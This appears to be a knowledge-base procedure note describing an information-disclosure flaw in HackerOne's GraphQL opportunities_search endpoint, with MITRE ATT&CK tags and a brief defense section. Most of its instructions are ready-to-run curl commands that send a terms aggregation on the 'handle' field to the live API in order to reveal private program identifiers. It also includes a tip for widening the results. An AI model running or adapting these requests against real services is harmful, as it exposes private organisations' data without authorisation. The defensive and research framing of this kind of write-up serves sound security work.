---
id: proc-execute-terms-aggregation
tags:
  - graphql
  - aggregation
  - information-disclosure
  - hackerone
type: procedure
tools:
  - '[[tools/GraphQL-Client]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/graphql-terms-aggregation-on-handle]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:25:53.564Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
---
# Execute Terms Aggregation Query on Handle Field

## Summary

This procedure crafts and executes a GraphQL query using the 'aggs' argument on the opportunities_search endpoint to perform terms aggregation on the 'handle' field, exposing private program data without access controls.

## Description

The vulnerability stems from aggregations not being filtered by user permissions or program privacy status, allowing queries to aggregate across all indexes including private ones. This step targets the 'handle' field to reveal private team identifiers and counts. It requires a prepared GraphQL client and assumes the attacker has basic access to the API.

## Requirements

1. Configured GraphQL client with HackerOne auth.
2. Knowledge of GraphQL syntax for aggregations.
3. Target endpoint: opportunities_search.

## Defense

Defensive measures and detection strategies:

- Apply user-context filters to all aggregation queries at the resolver level.
- Audit GraphQL schema to restrict 'aggs' on sensitive fields like 'handle'.
- Monitor for high-volume or unusual aggregation queries in API logs.

## Objectives

1. Trigger unfiltered terms aggregation to bypass privacy.
2. Retrieve buckets containing private handles.
3. Confirm exposure of sensitive aggregatable data.

## Instructions

### Step 1: Craft the Aggregation Query

**Context**: Build the query string with 'aggs' for terms on 'handle', using an empty search query for broad scope.

**Command** ([[commands/graphql-terms-aggregation-on-handle]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query { me { id } opportunities_search(query:{}, aggs:{results:{terms: {field:\"handle\"}}}) { aggs } }"}'
```

> This sends the query via curl. The 'terms' aggregation groups by 'handle' values. Expected output includes 'aggs' with buckets like {"key": "private", "doc_count": 1}.

### Step 2: Execute and Capture Response

**Context**: Run the query and save the response for analysis.

**Command** ([[commands/graphql-terms-aggregation-on-handle]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query { me { id } opportunities_search(query:{}, aggs:{results:{terms: {field:\"handle\"}}}) { aggs } }"}' > response.json
```

> Redirect output to file. Tweak 'terms' options like size: 10 for more buckets if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Data from Local System]] Data from Local System

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-terms-aggregation-on-handle]]

## Tools Used

- [[tools/GraphQL-Client]]

## Tags

- graphql
- aggregation
- info-disclosure
